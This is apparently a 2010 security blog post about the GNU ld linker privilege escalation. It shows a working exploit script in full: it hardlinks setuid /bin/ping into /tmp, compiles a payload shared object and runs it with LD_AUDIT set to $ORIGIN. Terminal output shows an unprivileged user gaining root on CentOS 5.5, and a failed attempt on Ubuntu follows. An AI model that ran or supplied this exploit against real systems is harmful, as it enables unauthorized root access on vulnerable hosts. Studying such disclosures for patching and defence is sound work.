---
layout: post
title: GNU ld privilege escalation
date: '2010-10-19T09:41:00.002+02:00'
author: Xavier Garcia
tags:
- escalation
- ld
- Linux
- setuid
modified_time: '2010-10-19T09:52:24.823+02:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-5464869096932934004
blogger_orig_url: http://www.shellguardians.com/2010/10/gnu-ld-privilege-escalation.html
---
Following this [post](http://seclists.org/fulldisclosure/2010/Oct/257) in a full disclosure list, I know about the privilege escalation  in the GNU ld linker.  
  
Some how, it seems to be RedHat centric or a didn't manage to make it work in Debian/Ubuntu.  
  
This is the exploit being executed in an up to date Centos 5.5  

``` 
bash-3.2$ ls  
exploit  payload.c  test.sh  
bash-3.2$ cat test.sh  
rm -rf /tmp/exploit  
mkdir /tmp/exploit  
ln /bin/ping /tmp/exploit/target  
exec 3< /tmp/exploit/target  
rm -rf /tmp/exploit/  
gcc -w -fPIC -shared -o /tmp/exploit payload.c  
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3  
  
bash-3.2$ id  
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=root:system_r:unconfined_t:SystemLow-SystemHigh  
bash-3.2$ sh test.sh  
[root@localhost tmp]# cat /etc/redhat-release  
CentOS release 5.5 (Final)  
[root@localhost tmp]# id  
uid=0(root) gid=99(nobody) groups=99(nobody) context=root:system_r:unconfined_t:SystemLow-SystemHigh  
[root@localhost tmp]#  
```
  
It does  not seem to work in Ubuntu 10.10:  

``` 
msk@ubuntu:/tmp$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=0  
kernel.yama.protected_sticky_symlinks = 0  
msk@ubuntu:/tmp$ sudo sysctl -w kernel.yama.protected_nonaccess_hardlinks=0  
kernel.yama.protected_nonaccess_hardlinks = 0  
msk@ubuntu:/tmp$ sh test.sh  
Inconsistency detected by ld.so: dl-open.c: 232: dl_open_worker: Assertion `(call_map)->l_name[0] == '\0'' failed!  
msk@ubuntu:/tmp$
```
